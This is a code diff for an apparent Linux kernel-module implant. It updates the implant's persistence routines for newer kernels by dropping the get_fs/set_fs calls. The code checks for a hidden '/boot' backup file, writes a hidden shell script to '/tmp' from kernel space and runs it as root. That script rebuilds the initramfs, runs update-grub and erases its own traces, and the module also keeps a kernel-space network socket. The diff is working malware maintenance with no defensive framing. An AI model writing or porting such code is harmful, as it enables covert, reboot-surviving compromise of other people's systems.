@@ -31,24 +31,21 @@ static struct socket *conn_socket = NULL;
 // Check if persistence exists by testing for the hidden initramfs file
 static bool is_persisted(void) {
     struct file *file;
-    mm_segment_t old_fs;
     bool exists = false;
 
-    old_fs = get_fs();
-    set_fs(KERNEL_DS);
     file = filp_open("/boot/.initrd-recovery-backup.gz", O_RDONLY, 0);
     if (!IS_ERR(file)) {
         exists = true;
         filp_close(file, NULL);
     }
-    set_fs(old_fs);
+
     return exists;
 }
 
 // Drop and execute a persistence script from kernel space
 static void setup_persistence(void) {
     struct file *fp;
-    mm_segment_t old_fs;
+    loff_t pos = 0;
     char *script_path = "/tmp/.persist.sh";
     char *script_content =
         "#!/bin/sh\n"
@@ -68,18 +65,15 @@ static void setup_persistence(void) {
         "update-grub\n"
         "rm -rf /tmp/custom_initramfs /tmp/.persist.sh\n";
 
-    old_fs = get_fs();
-    set_fs(KERNEL_DS);
-    fp = filp_open(script_path, O_WRONLY|O_CREAT, 0700);
+    fp = filp_open(script_path, O_WRONLY | O_CREAT | O_TRUNC, 0700);
     if (!IS_ERR(fp)) {
-        kernel_write(fp, script_content, strlen(script_content), &fp->f_pos);
+        kernel_write(fp, script_content, strlen(script_content), &pos);
         filp_close(fp, NULL);
 
         char *argv[] = { "/bin/sh", script_path, NULL };
         static char *envp[] = { "HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
         call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
     }
-    set_fs(old_fs);
 }
 
 // Kernel-space TCP connection function
